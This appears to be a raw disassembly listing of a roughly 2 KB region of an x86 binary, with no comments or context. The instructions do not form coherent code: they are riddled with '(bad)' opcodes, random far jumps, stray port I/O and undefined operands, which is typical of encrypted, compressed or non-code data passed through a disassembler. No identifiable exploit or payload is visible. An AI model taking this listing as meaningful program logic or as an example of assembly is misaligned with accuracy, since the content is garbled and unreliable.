  424e58:	mov    DWORD PTR [esi-0x218f4f44],esi
  424e5e:	in     eax,dx
  424e5f:	test   esp,ecx
  424e61:	pop    ebx
  424e62:	rol    BYTE PTR [eax],0xfd
  424e65:	mov    dh,0xe
  424e67:	mov    edx,0x38edb5b0
  424e6c:	cdq    
  424e6d:	inc    edi
  424e6e:	jge    0x424e44
  424e70:	dec    ebp
  424e71:	dec    eax
  424e72:	adc    BYTE PTR [ecx],0xc5
  424e75:	fisubr DWORD PTR [ebp+0x69]
  424e78:	sti    
  424e79:	dec    ecx
  424e7a:	mov    ecx,ebp
  424e7c:	cli    
  424e7d:	jge    0x424e69
  424e7f:	adc    ch,BYTE PTR gs:[ebp+0x4bb5b04a]
  424e86:	add    DWORD PTR cs:[edx],0x112671f1
  424e8d:	jbe    0x424e9b
  424e8f:	or     ebp,DWORD PTR [ebp-0x45]
  424e92:	popa   
  424e93:	scas   al,BYTE PTR es:[edi]
  424e94:	add    al,BYTE PTR cs:[eax-0x20cf3b35]
  424e9b:	call   0x1150cf42
  424ea0:	pop    edi
  424ea1:	aad    0x5d
  424ea3:	pop    ebx
  424ea4:	aaa    
  424ea5:	inc    edi
  424ea6:	test   ecx,esp
  424ea8:	loop   0x424ec7
  424eaa:	out    0x30,al
  424eac:	pop    eax
  424ead:	mov    ebx,0x685b6163
  424eb2:	mov    edi,0x55d4964f
  424eb7:	sbb    al,0x5e
  424eb9:	lahf   
  424eba:	fst    QWORD PTR [esi-0x5f9b9e81]
  424ec0:	adc    ebp,esp
  424ec2:	add    BYTE PTR [edi-0x3882ffda],dh
  424ec8:	out    0x15,al
  424eca:	imul   ecx,DWORD PTR [ebp+0x6e2db6a5],0x2038a15b
  424ed4:	jge    0x424e68
  424ed6:	and    DWORD PTR [ebp-0x57256896],0x9b115942
  424ee0:	icebp  
  424ee1:	adc    BYTE PTR [edi],0x6d
  424ee4:	ins    BYTE PTR es:[edi],dx
  424ee5:	in     eax,dx
  424ee6:	add    ch,BYTE PTR [edi-0x79]
  424ee9:	push   0x3caf6b02
  424eee:	push   esi
  424eef:	mov    ebx,0x38ba54b1
  424ef4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ef5:	lods   al,BYTE PTR ds:[esi]
  424ef6:	outs   dx,BYTE PTR ds:[esi]
  424ef7:	lds    ebx,FWORD PTR [ecx]
  424ef9:	add    BYTE PTR [edi],al
  424efb:	mov    DWORD PTR [ebx+ebx*8+0x4d5bb5b8],esp
  424f02:	or     edx,esp
  424f04:	inc    edi
  424f05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f06:	inc    ebx
  424f07:	sbb    al,0x45
  424f09:	ficom  DWORD PTR [ebp+0x6d442db4]
  424f0f:	js     0x424eeb
  424f11:	cmp    ch,BYTE PTR [ecx+0x6c70b57a]
  424f17:	pop    ebx
  424f18:	push   ebx
  424f19:	cwde   
  424f1a:	xchg   ecx,eax
  424f1b:	sbb    eax,0x939e9e6a
  424f20:	ins    BYTE PTR es:[edi],dx
  424f21:	fist   DWORD PTR [edx+0x23]
  424f24:	mov    esi,DWORD PTR [edx]
  424f26:	addr16 fwait
  424f28:	inc    esp
  424f29:	mov    edi,0x2db5b01c
  424f2e:	sub    al,0x10
  424f30:	mov    bl,0xe5
  424f32:	and    eax,0xfdfafa1
  424f37:	mov    dh,0x6d
  424f39:	mov    bh,0x46
  424f3b:	call   0xe15:0x98af89f8
  424f42:	push   ebx
  424f43:	dec    ebp
  424f44:	mov    ch,0xb5
  424f46:	push   0xffffff81
  424f48:	ss daa 
  424f4a:	call   0xc2d02ec3
  424f4f:	mov    dh,0xb5
  424f51:	push   0xffffffa3
  424f53:	mov    eax,0x6a2af5b1
  424f58:	shl    DWORD PTR [ecx],0xd8
  424f5b:	outs   dx,DWORD PTR cs:[esi]
  424f5d:	frstor [edi-0x19324c00]
  424f63:	dec    edx
  424f64:	or     eax,0xc2c285d1
  424f69:	mov    dh,0x4
  424f6b:	inc    esi
  424f6c:	je     0x424f9a
  424f6e:	inc    esi
  424f6f:	and    BYTE PTR [ecx],al
  424f71:	sub    eax,DWORD PTR [ebx+0x17]
  424f74:	fimul  DWORD PTR [ebp-0x42e22191]
  424f7a:	push   0x7170b0fa
  424f7f:	ins    DWORD PTR es:[edi],dx
  424f80:	mov    ch,0xb
  424f82:	in     eax,dx
  424f83:	push   ebp
  424f84:	mov    eax,0x4c4cbbc8
  424f89:	clc    
  424f8a:	pop    ebx
  424f8b:	fnsave [ebp+0x5b]
  424f8e:	xor    BYTE PTR [ecx-0x2772ed7],dh
  424f94:	aam    0x74
  424f96:	cdq    
  424f97:	ret    
  424f98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f99:	lea    ebp,[ebp-0x5d]
  424f9c:	mov    BYTE PTR ds:0x810dc505,dl
  424fa2:	mov    eax,0x1a376d44
  424fa7:	mov    bh,0x2e
  424fa9:	sahf   
  424faa:	mov    ds:0xe63f9075,al
  424faf:	push   es
  424fb0:	arpl   WORD PTR es:[ebp-0x25],bp
  424fb4:	mov    dh,0xb6
  424fb6:	push   eax
  424fb7:	es add eax,0x2547b177
  424fbd:	adc    al,0x4d
  424fbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424fc0:	ins    DWORD PTR es:[edi],dx
  424fc1:	aaa    
  424fc2:	mov    dh,0xa5
  424fc4:	jg     0x424f67
  424fc6:	test   eax,0x8881bde3
  424fcb:	daa    
  424fcc:	in     al,dx
  424fcd:	rcl    BYTE PTR [esi+0x5fb6da16],1
  424fd3:	int    0x29
  424fd5:	mov    edi,0x6e45dfce
  424fda:	clc    
  424fdb:	shl    dh,1
  424fdd:	pop    ebp
  424fde:	fadd   DWORD PTR [edx]
  424fe0:	or     DWORD PTR [ebp+0x77],edx
  424fe3:	hlt    
  424fe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424fe5:	cmp    DWORD PTR [eax+0x6858839d],ebx
  424feb:	pop    ebx
  424fec:	sbb    bl,BYTE PTR [ecx-0x32]
  424fef:	push   ss
  424ff0:	outs   dx,BYTE PTR ds:[esi]
  424ff1:	push   ecx
  424ff2:	mov    ch,0x8d
  424ff4:	or     ebx,DWORD PTR [ebx-0x2c]
  424ff7:	mov    ds:0x7b294604,al
  424ffc:	pop    es
  424ffd:	sbb    BYTE PTR [ebx],0xcb
  425000:	fild   QWORD PTR [esi]
  425002:	dec    ebp
  425003:	std    
  425004:	and    DWORD PTR [eax-0x6d],ebp
  425007:	add    BYTE PTR [edi+0x57e900a8],al
  42500d:	fdivrp st(3),st
  42500f:	sub    al,0x6d
  425011:	mov    ch,0xb
  425013:	out    dx,al
  425014:	and    al,ah
  425016:	in     al,dx
  425017:	mov    ebx,0xb5131d61
  42501c:	sub    eax,0xf52e2d6d
  425021:	inc    ebx
  425022:	mov    ch,0xdd
  425024:	inc    esp
  425025:	(bad)  
  425026:	cdq    
  425027:	mov    dh,0xed
  425029:	ret    0xacb6
  42502c:	adc    ch,BYTE PTR [ebx+esi*8]
  42502f:	cmp    cl,dh
  425031:	jae    0x425080
  425033:	cmp    edx,DWORD PTR [edi]
  425035:	stos   BYTE PTR es:[edi],al
  425036:	ret    0xb5b6
  425039:	adc    eax,0x5b905f28
  42503e:	mov    DWORD PTR [edx+eiz*1+0x49],ebx
  425042:	xchg   ebp,eax
  425043:	sbb    ch,BYTE PTR [ebx+ebx*8-0x73]
  425047:	jp     0x4250a0
  425049:	add    ah,BYTE PTR [ecx+0x62]
  42504c:	sbb    esp,DWORD PTR [edx+0x26a168b6]
  425052:	mov    ds:0xd9a9ec1,eax
  425057:	pop    eax
  425058:	pusha  
  425059:	jmp    0x42506a
  42505b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42505c:	or     BYTE PTR [eax+0xb9040a2],dh
  425062:	pop    ebx
  425063:	mov    ebx,0xddf11d6d
  425068:	in     eax,0xad
  42506a:	jge    0x425089
  42506c:	data16 or cl,BYTE PTR [ebx]
  42506f:	and    al,0xb6
  425072:	ins    DWORD PTR es:[edi],dx
  425073:	xchg   ebp,eax
  425074:	call   DWORD PTR [ebx+0x1a]
  425077:	mov    ecx,0x585d38e7
  42507c:	push   0x5c5646bb
  425081:	je     0x42508a
  425083:	pop    es
  425084:	jl     0x42505b
  425086:	or     esi,DWORD PTR [edi-0xd4f4a53]
  42508c:	mov    bl,0xf1
  42508e:	pop    eax
  42508f:	hlt    
  425090:	das    
  425091:	aas    
  425092:	out    dx,eax
  425093:	push   es
  425094:	popa   
  425095:	pop    eax
  425096:	push   0x8a4b1a37
  42509b:	add    dl,ah
  42509d:	push   eax
  42509e:	in     eax,0x59
  4250a0:	ins    DWORD PTR es:[edi],dx
  4250a1:	fistp  DWORD PTR [eax+0x58]
  4250a4:	push   edx
  4250a5:	jnp    0x42509e
  4250a7:	sahf   
  4250a8:	imul   edx,DWORD PTR [edx+0x38],0xb616f8de
  4250af:	test   DWORD PTR [ebp-0x290e303],eax
  4250b5:	push   0x14
  4250b7:	mov    dh,0xe2
  4250b9:	sub    al,0x16
  4250bb:	mov    dh,0x6d
  4250bd:	(bad)  
  4250bf:	imul   ebx,ebp,0x9
  4250c2:	sub    al,0x62
  4250c4:	mov    al,0xcd
  4250c6:	push   edx
  4250c7:	shl    DWORD PTR [edi],cl
  4250c9:	push   ss
  4250ca:	retf   0xbf85
  4250cd:	jae    0x4250a9
  4250cf:	inc    ebx
  4250d0:	retf   0x5e18
  4250d3:	les    esp,FWORD PTR [ebx+0x61]
  4250d6:	arpl   WORD PTR [ebx-0x6b],bp
  4250d9:	repnz or DWORD PTR [eax+0x1898cd0f],ebp
  4250e0:	mov    dh,0xb1
  4250e2:	jge    0x425155
  4250e4:	push   esp
  4250e5:	push   0xffffff93
  4250e7:	pop    esp
  4250e8:	xor    eax,0x1d514bd1
  4250ed:	mov    eax,0x35edb6d0
  4250f2:	mov    ebp,0xcfb28711
  4250f7:	sbb    bl,BYTE PTR [edi]
  4250f9:	push   ds
  4250fa:	ins    BYTE PTR es:[edi],dx
  4250fb:	mov    ds:0x60db7976,al
  425100:	inc    ebp
  425101:	or     BYTE PTR [eax-0x484d8300],bl
  425107:	mov    esp,0xda9f43d4
  42510c:	cmp    cl,al
  42510e:	and    al,0xc9
  425110:	jmp    0xc16d:0xc6c256a7
  425117:	repz mov al,ds:0xcaa64d48
  42511d:	inc    DWORD PTR [eax*4-0x3bab292e]
  425124:	cmp    al,0x43
  425126:	and    BYTE PTR [ecx+0x42c15c09],0xbb
  42512d:	shr    BYTE PTR [ebp-0x25be65e5],0xd3
  425134:	arpl   WORD PTR [ebx],ax
  425136:	pop    eax
  425137:	push   0x6e0653ad
  42513c:	pop    ebx
  42513d:	jmp    0x2e42:0xc2ed6dbf
  425144:	mov    dh,ah
  425146:	lock imul ebx,ebp,0x89b66595
  42514d:	mov    eax,0xb3c8bfb4
  425152:	clc    
  425153:	das    
  425154:	xlat   BYTE PTR ds:[ebx]
  425155:	js     0x42513f
  425157:	push   eax
  425158:	or     esp,DWORD PTR [ebp+0x5c73dad8]
  42515e:	jp     0x42514b
  425160:	push   ebp
  425161:	adc    BYTE PTR [edx],dl
  425163:	mov    al,ds:0xf7b42e89
  425168:	mov    bl,0x46
  42516a:	xchg   ebp,eax
  42516b:	test   al,0x7b
  42516d:	jmp    FWORD PTR [ebp+0x5b]
  425170:	pop    ebx
  425171:	or     DWORD PTR [edx+0x6e],ecx
  425174:	jne    0x425180
  425176:	sbb    eax,0xc68d47cb
  42517b:	repnz aaa 
  42517d:	xchg   BYTE PTR [ecx+0x94c700],cl
  425183:	aas    
  425184:	cmp    al,0x1b
  425186:	pop    ebp
  425187:	dec    eax
  425188:	pop    ebx
  425189:	sbb    eax,0x7cbd85d0
  42518e:	sub    eax,0x3769f40c
  425193:	pusha  
  425194:	push   0x86b615bb
  425199:	mov    esp,0x2e0b1c9d
  42519e:	out    dx,al
  42519f:	lods   eax,DWORD PTR ds:[esi]
  4251a0:	or     BYTE PTR [esi-0x2b825e93],dh
  4251a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4251a7:	sti    
  4251a8:	in     al,dx
  4251a9:	cli    
  4251aa:	and    eax,0xd9ce5d11
  4251af:	jle    0x425212
  4251b1:	imul   edx,DWORD PTR [edi-0x4641b39b],0x6b
  4251b8:	shr    DWORD PTR [ebx],1
  4251ba:	aas    
  4251bb:	fld    QWORD PTR [eax]
  4251bd:	lods   al,BYTE PTR ds:[esi]
  4251be:	jmp    0x425217
  4251c0:	mov    edi,0x523256db
  4251c5:	loopne 0x425166
  4251c7:	xlat   BYTE PTR ds:[ebx]
  4251c8:	sub    DWORD PTR [ebx-0x2f],edx
  4251cb:	jecxz  0x425230
  4251cd:	push   ebx
  4251ce:	rcl    al,1
  4251d0:	push   esi
  4251d1:	mov    ecx,0x50e23072
  4251d6:	mov    ah,0x5
  4251d8:	push   edi
  4251d9:	dec    ebx
  4251da:	ins    DWORD PTR es:[edi],dx
  4251db:	and    al,0xef
  4251dd:	in     al,dx
  4251de:	inc    esp
  4251df:	and    ecx,DWORD PTR [eax-0x55ea44be]
  4251e5:	shl    BYTE PTR [eax],0x92
  4251e8:	iret   
  4251e9:	scas   eax,DWORD PTR es:[edi]
  4251ea:	enter  0xf05b,0xa9
  4251ee:	dec    ebx
  4251ef:	fistp  DWORD PTR [esi]
  4251f1:	sub    DWORD PTR [edi+0x3fed1c8f],esi
  4251f7:	lock push esp
  4251f9:	ins    DWORD PTR es:[edi],dx
  4251fa:	arpl   WORD PTR [ebx-0x5f],sp
  4251fd:	lods   al,BYTE PTR ds:[esi]
  4251fe:	fsubr  st(3),st
  425200:	mov    ebp,0x263521f9
  425205:	inc    esi
  425206:	add    eax,eax
  425208:	test   DWORD PTR [edx],edi
  42520a:	add    DWORD PTR [esi+0x70],ebx
  42520d:	mov    ds:0xadc11e86,eax
  425212:	(bad)  
  425213:	aam    0xec
  425215:	test   al,0x11
  425217:	inc    esp
  425218:	mov    esi,0x56ed71f4
  42521d:	outs   dx,BYTE PTR ds:[esi]
  42521e:	dec    ebp
  42521f:	js     0x425291
  425221:	gs cs or al,0x2f
  425225:	xchg   ebp,eax
  425226:	and    BYTE PTR fs:[ebx-0x5c4ae492],ah
  42522d:	lods   eax,DWORD PTR ds:[esi]
  42522e:	(bad)  
  42522f:	sub    BYTE PTR [ecx],dl
  425231:	popf   
  425232:	cmp    ebp,ebp
  425234:	fcomp  st(2)
  425236:	test   DWORD PTR [esi-0x44fdbeb7],esi
  42523c:	or     BYTE PTR [ebp-0x62],al
  42523f:	mov    eax,ds:0xdca161ca
  425244:	ss sub al,0x14
  425247:	inc    edi
  425248:	daa    
  425249:	jp     0x4251f7
  42524b:	jle    0x425278
  42524d:	sbb    ebx,DWORD PTR ds:0x44466dc5
  425253:	retf   
  425254:	shr    DWORD PTR [ecx+ebx*1],cl
  425257:	push   edi
  425258:	jmp    0x4252c9
  42525a:	mov    ebx,0x13f31ba8
  42525f:	add    eax,0x144e1639
  425264:	imul   eax,DWORD PTR [eax],0xb0b1b8b7
  42526a:	sub    eax,0xa3155981
  42526f:	call   0xb13d372b
  425274:	inc    esp
  425275:	mov    ebx,0xdd8221d0
  42527a:	and    DWORD PTR [edx-0x4b5233a2],ebp
  425280:	sar    BYTE PTR [edx+0x49ffa91c],1
  425286:	sbb    BYTE PTR [eax+0x4a],0x66
  42528a:	lea    esi,[esi+0x61]
  42528d:	imul   esi,DWORD PTR [edx+edi*2-0x17],0x64
  425292:	es pop eax
  425294:	push   0x8dc41d48
  425299:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42529a:	xchg   ebx,eax
  42529b:	je     0x4252ff
  42529d:	data16 and al,0xb2
  4252a0:	sub    ch,cl
  4252a2:	sbb    esp,DWORD PTR [ebp+0x42838d1b]
  4252a8:	or     al,0x88
  4252aa:	mov    cl,0x2c
  4252ac:	fidivr WORD PTR [ebx]
  4252ae:	outs   dx,BYTE PTR ds:[esi]
  4252af:	mov    ah,0x8d
  4252b1:	or     esp,DWORD PTR [ebp+esi*2+0x6e]
  4252b5:	cdq    
  4252b6:	bound  edx,QWORD PTR [eax+0x75]
  4252b9:	push   ebp
  4252ba:	leave  
  4252bb:	mov    al,ds:0x9116d6ed
  4252c0:	add    DWORD PTR ds:0x479d49c5,ebx
  4252c6:	cmp    DWORD PTR [ebx-0x7dc6ef4b],0xc58ba0c1
  4252d0:	inc    edx
  4252d1:	loopne 0x4252ed
  4252d3:	add    bl,bl
  4252d5:	inc    edx
  4252d6:	jns    0x425325
  4252d8:	or     edx,DWORD PTR [ebp+0x6a5c03de]
  4252de:	xchg   edi,eax
  4252df:	sti    
  4252e0:	enter  0x142e,0xe6
  4252e4:	sub    eax,0x2d2a011
  4252e9:	icebp  
  4252ea:	push   0xf1196c98
  4252ef:	cmp    BYTE PTR ss:[esi],dh
  4252f2:	sbb    bl,BYTE PTR [ebx-0x40]
  4252f5:	data16 (bad) 
  4252f7:	out    dx,eax
  4252f8:	test   al,0x48
  4252fa:	jb     0x425333
  4252fc:	push   ss
  4252fd:	ss push ss
  4252ff:	in     eax,0xf7
  425301:	loope  0x425320
  425303:	pop    eax
  425304:	push   esi
  425305:	test   al,0xc3
  425307:	sub    eax,0x6d5346e1
  42530c:	in     al,dx
  42530d:	fcomp  QWORD PTR ds:0x44d1bd08
  425313:	mov    gs,WORD PTR [ebx+0xb]
  425316:	lods   eax,DWORD PTR ds:[esi]
  425317:	push   edx
  425318:	cmp    BYTE PTR [esi+0x76],ah
  42531b:	sub    ecx,DWORD PTR [ecx-0x7249e99e]
  425321:	jbe    0x425322
  425323:	cmp    bl,BYTE PTR [ebx+0x7b8c4500]
  425329:	inc    esi
  42532a:	pop    es
  42532b:	mov    eax,ds:0xb0d8da5d
  425330:	cwde   
  425331:	jmp    0x7c38:0xa0c1a1b0
  425338:	mov    bh,0x85
  42533a:	jbe    0x4253a7
  42533c:	jbe    0x42538a
  42533e:	(bad)  
  42533f:	xchg   ebx,eax
  425340:	cmc    
  425341:	mov    bl,ah
  425343:	fld    QWORD PTR [esi-0x50]
  425346:	adc    dl,BYTE PTR [edi+0x2c100a96]
  42534c:	pop    ss
  42534d:	add    eax,0xb4a31c2c
  425352:	lods   eax,DWORD PTR ds:[esi]
  425353:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425354:	fidivr DWORD PTR [ebx-0x50c01ec4]
  42535a:	push   0x59
  42535c:	lods   eax,DWORD PTR ds:[esi]
  42535d:	and    eax,0x6c951b0c
  425362:	(bad)  
  425363:	sub    BYTE PTR [ebx],ch
  425365:	jg     0x425332
  425367:	outs   dx,DWORD PTR ds:[esi]
  425368:	cs mov dh,0xd5
  42536b:	dec    edx
  42536c:	not    ebp
  42536e:	xchg   edx,eax
  42536f:	mov    dl,0x30
  425371:	add    BYTE PTR [ecx+0x64],bl
  425374:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425375:	mov    bh,0xb6
  425377:	jno    0x4253e4
  425379:	mov    ecx,0xf69765d1
  42537e:	xor    eax,0x8896b6ef
  425383:	stos   BYTE PTR es:[edi],al
  425384:	jbe    0x425361
  425386:	pop    edx
  425387:	ins    DWORD PTR es:[edi],dx
  425388:	or     BYTE PTR [edi-0xafc52c2],dl
  42538e:	pop    ebx
  42538f:	stc    
  425390:	pop    ss
  425391:	xchg   esi,eax
  425392:	aad    0xe0
  425394:	lods   al,BYTE PTR ds:[esi]
  425395:	sbb    BYTE PTR [eax],al
  425397:	push   edi
  425398:	xchg   ecx,eax
  425399:	add    BYTE PTR ds:0xe8ae8919,al
  42539f:	mov    dh,0x2d
  4253a1:	ins    BYTE PTR es:[edi],dx
  4253a2:	mov    eax,ds:0xc26f825e
  4253a7:	shr    BYTE PTR [ecx],1
  4253a9:	pop    edx
  4253aa:	pusha  
  4253ab:	lods   eax,DWORD PTR ds:[esi]
  4253ac:	fstp   st(2)
  4253ae:	sbb    dh,BYTE PTR cs:[edx+0x57]
  4253b2:	adc    al,0xa7
  4253b4:	das    
  4253b5:	in     eax,dx
  4253b6:	cmp    ebp,DWORD PTR [ebx-0x4924927b]
  4253bc:	push   0x17
  4253be:	xchg   esi,eax
  4253bf:	mov    esi,eax
  4253c1:	retf   
  4253c2:	mov    BYTE PTR [ebp+0x176bbb90],dl
  4253c8:	or     dh,BYTE PTR [edi+0x7e798c74]
  4253ce:	xchg   ecx,eax
  4253cf:	cmp    eax,0xad47ff6e
  4253d4:	stc    
  4253d5:	(bad)  
  4253d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4253d7:	ins    DWORD PTR es:[edi],dx
  4253d8:	pop    edx
  4253d9:	jno    0x42542e
  4253db:	xor    eax,0xf809bc71
  4253e0:	add    BYTE PTR [ebp-0x2bd48986],al
  4253e6:	push   edx
  4253e7:	sub    DWORD PTR [ebx],ecx
  4253e9:	and    bl,BYTE PTR [ecx-0x7c]
  4253ec:	fwait
  4253ed:	mov    eax,ds:0xb6836d6e
  4253f2:	into   
  4253f3:	lock jg 0x4253a7
  4253f6:	inc    edi
  4253f7:	adc    al,0x8a
  4253f9:	xor    DWORD PTR [eax+edx*8],ebp
  4253fc:	push   ss
  4253fd:	ss pusha 
  4253ff:	out    0x6d,eax
  425401:	push   es
  425402:	ja     0x42547c
  425404:	mov    ds,ebx
  425406:	push   es
  425407:	mov    esp,0x8d43fc6e
  42540c:	aaa    
  42540d:	sub    eax,0x53ccc5ef
  425412:	dec    ebp
  425413:	icebp  
  425414:	mov    eax,ds:0x1b12654f
  425419:	pop    ds
  42541a:	test   BYTE PTR [ebp+0x5adc55d],0x3d
  425421:	loope  0x4253b4
  425423:	xchg   ebp,eax
  425424:	sbb    ecx,edi
  425426:	fucomip st,st(5)
  425428:	ret    0xb56
  42542b:	out    dx,al
  42542c:	in     eax,dx
  42542d:	sbb    esp,DWORD PTR gs:[ecx-0x16]
  425431:	pop    edi
  425432:	out    0x8a,al
  425434:	test   DWORD PTR [ebx],ebx
  425436:	pop    ebx
  425437:	in     eax,0x1e
  425439:	fcom   DWORD PTR [eax-0xd]
  42543c:	jg     0x4254bd
  42543e:	inc    esp
  42543f:	dec    ebx
  425440:	pop    ss
  425441:	sbb    bl,dh
  425443:	xor    edi,ebp
  425445:	xor    al,BYTE PTR [edi-0x7d]
  425448:	mov    ch,BYTE PTR [eax+eax*1+0x2e]
  42544c:	jne    0x42549f
  42544e:	mov    esp,0x5a225f35
  425453:	push   edx
  425454:	or     eax,0x5db52eb
  425459:	scas   al,BYTE PTR es:[edi]
  42545a:	outs   dx,DWORD PTR ds:[esi]
  42545b:	retf   0x5cb3
  42545e:	adc    BYTE PTR [esi+0x61],bh
  425461:	mov    eax,0xff656db4
  425466:	mov    DWORD PTR [ecx+0x5c],esp
  425469:	out    dx,eax
  42546a:	lods   eax,DWORD PTR ds:[esi]
  42546b:	jne    0x425414
  42546d:	(bad)  
  42546e:	mov    eax,0xeb258d0
  425473:	and    al,0xc4
  425475:	and    al,0xae
  425477:	pop    ss
  425478:	xchg   ebp,eax
  425479:	retf   
  42547a:	lea    esp,[esi-0x2ad30e16]
  425480:	test   eax,0x277efcd8
  425485:	(bad)  
  425486:	shr    BYTE PTR [ebp+0x6b],cl
  425489:	xchg   ebp,eax
  42548a:	add    bl,BYTE PTR [ebp-0x71]
  42548d:	(bad)  
  42548e:	sbb    eax,0xdc6a4ea9
  425493:	fcmovb st,st(2)
  425495:	and    DWORD PTR [esi-0x60],0x737759d0
  42549c:	jns    0x42550d
  42549e:	ret    0xbb46
  4254a1:	popa   
  4254a2:	cmc    
  4254a3:	sbb    esp,DWORD PTR [ebp+0x2a]
  4254a6:	loopne 0x42549b
  4254a8:	rol    BYTE PTR [edi],1
  4254aa:	cs sub eax,0x5044db6c
  4254b0:	or     BYTE PTR [ebx+0x41963184],al
  4254b6:	pop    es
  4254b7:	je     0x42544f
  4254b9:	add    eax,0xaf7c156e
  4254be:	imul   bx,si,0x39
  4254c2:	ret    0x1636
  4254c5:	or     dl,ch
  4254c7:	push   cs
  4254c8:	pop    esi
  4254c9:	add    DWORD PTR [ecx+0x33],edx
  4254cc:	push   esi
  4254cd:	rcl    DWORD PTR [edx+0x7],1
  4254d0:	fcom   QWORD PTR [esi-0x53]
  4254d3:	sub    eax,0x88fbc7c0
  4254d8:	std    
  4254d9:	bound  edi,QWORD PTR [ebx+0x677710b5]
  4254df:	(bad)  
  4254e0:	and    edx,DWORD PTR [ecx]
  4254e2:	dec    ebx
  4254e3:	push   DWORD PTR [eax+ebx*4]
  4254e6:	mov    bh,0xa5
  4254e8:	ins    DWORD PTR es:[edi],dx
  4254e9:	test   eax,0x2c42b908
  4254ee:	sti    
  4254ef:	retf   
  4254f0:	nop
  4254f1:	push   cs
  4254f2:	or     DWORD PTR [ecx+0x6da3696d],ebx
  4254f8:	cmp    DWORD PTR [ebp+0x35],0xffffff8d
  4254fc:	out    0x38,eax
  4254fe:	fs enter 0xb7fc,0x85
  425503:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425504:	dec    esi
  425505:	sahf   
  425506:	sbb    al,0x1f
  425508:	and    eax,0x3d940e
  42550d:	aam    0x61
  42550f:	add    BYTE PTR [eax],dh
  425511:	and    al,0xb7
  425513:	(bad)  
  425514:	push   edi
  425515:	mov    ah,0xb8
  425517:	and    dl,BYTE PTR [ecx-0x49]
  42551a:	pop    ecx
  42551b:	or     esi,DWORD PTR ds:0x68ddab76
  425521:	imul   ecx,DWORD PTR [edi+ecx*1],0xb
  425525:	retf   
  425526:	popa   
  425527:	add    ebp,DWORD PTR [ecx+0xb]
  42552a:	mov    dh,0xb6
  42552c:	test   DWORD PTR [ebp-0x205cd1d2],ebp
  425532:	sti    
  425533:	adc    dh,ah
  425535:	lods   al,BYTE PTR ds:[esi]
  425536:	lea    esi,[esi+0x719bdb71]
  42553c:	mov    al,0xe2
  42553e:	or     BYTE PTR [ebx+0x3b],0x38
  425542:	jmp    0xe91d:0xb7685858
  425549:	outs   dx,BYTE PTR ds:[esi]
  42554a:	inc    ecx
  42554b:	sti    
  42554c:	xchg   esp,eax
  42554d:	and    BYTE PTR [esi+0x76ff2895],bh
  425553:	pop    ebx
  425554:	icebp  
  425555:	mov    cl,0x62
  425557:	jmp    0x13e0b5e
  42555c:	jp     0x42550b
  42555e:	add    dl,ch
  425560:	inc    ecx
  425561:	arpl   WORD PTR [ecx-0x2377a5a3],bp
  425567:	jmp    0x8c5c7680
  42556c:	push   0xffffffb1
  42556e:	pop    ss
  42556f:	mov    dh,0x72
  425571:	imul   esi,eax,0x8f53c9e
  425577:	loop   0x4255e3
  425579:	shr    edx,0xb5
  42557c:	mov    ?,WORD PTR [esi+0x59098c6d]
  425582:	mov    esp,0x71a4572c
  425587:	stc    
  425588:	mov    dh,0x89
  42558a:	mov    eax,0xecf9fd53
  42558f:	jbe    0x425529
  425591:	cmp    BYTE PTR [ecx-0x25358200],ah
  425597:	cs ins DWORD PTR es:[edi],dx
  425599:	pop    ebx
  42559a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42559b:	inc    eax
  42559c:	fistp  WORD PTR es:[eax-0x7d5befcf]
  4255a3:	lods   eax,DWORD PTR ds:[esi]
  4255a4:	ins    DWORD PTR es:[edi],dx
  4255a5:	mov    bh,0x26
  4255a7:	test   al,0xe8
  4255a9:	pop    esp
  4255aa:	lahf   
  4255ab:	mov    dh,0xbc
  4255ad:	fist   DWORD PTR [ebp+0x4ab617a1]
  4255b3:	(bad)  
  4255b5:	sahf   
  4255b6:	jp     0x42562e
  4255b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4255b9:	div    DWORD PTR [edx]
  4255bb:	push   edx
  4255bc:	jne    0x4255a0
  4255be:	popa   
  4255bf:	test   eax,0xddeb0add
  4255c4:	dec    edi
  4255c5:	mov    cl,0x1a
  4255c7:	ja     0x4255de
  4255c9:	jae    0x42559c
  4255cb:	test   al,0xad
  4255cd:	jne    0x425553
  4255cf:	ficom  WORD PTR [eax]
  4255d1:	pop    ecx
  4255d2:	lds    ecx,FWORD PTR [edx-0x449293d3]
  4255d8:	mov    edx,0x46dafcd0
  4255dd:	pop    esp
  4255de:	lds    ecx,FWORD PTR [edi-0x1ebf4ae1]
  4255e4:	inc    esi
  4255e5:	mov    ebx,0xce6439ad
  4255ea:	shr    BYTE PTR [ebx-0x4927867c],0x8d
  4255f1:	push   edx
  4255f2:	and    bh,BYTE PTR [ecx]
  4255f4:	(bad)  
  4255f5:	(bad)  
  4255f6:	sbb    ah,BYTE PTR [eax]
  4255f8:	add    ch,0xb6
  4255fb:	je     0x4255d8
  4255fd:	arpl   WORD PTR [eax-0x25b68d68],di
  425603:	xchg   BYTE PTR [edx+0x6e87a5b9],ch
  425609:	or     eax,0x63831678
  42560e:	mov    eax,ds:0x6d6209f5
  425613:	mov    eax,DWORD PTR [ebp-0x515b6c5b]
  425619:	sbb    DWORD PTR [eax+0x631d9906],edx
  42561f:	adc    eax,DWORD PTR [eax-0x49]
  425622:	jl     0x4255a7
  425624:	mov    ecx,0x13b765c3
  425629:	jmp    0x29e5:0x56e36d6d
  425630:	ror    edi,0x4d
  425633:	inc    esp
  425634:	mov    WORD PTR [eax-0x16],?
  425637:	push   edx
  425638:	pop    ebx
  425639:	mov    eax,0x585a0b3b
  42563e:	adc    al,0xce
  425640:	pop    ecx
  425641:	push   esp
  425642:	or     esi,DWORD PTR [ebx+ebp*2-0x65]
  425646:	test   al,0x5e
  425648:	add    cl,BYTE PTR [eax+0x71]
  42564b:	out    0xd7,al
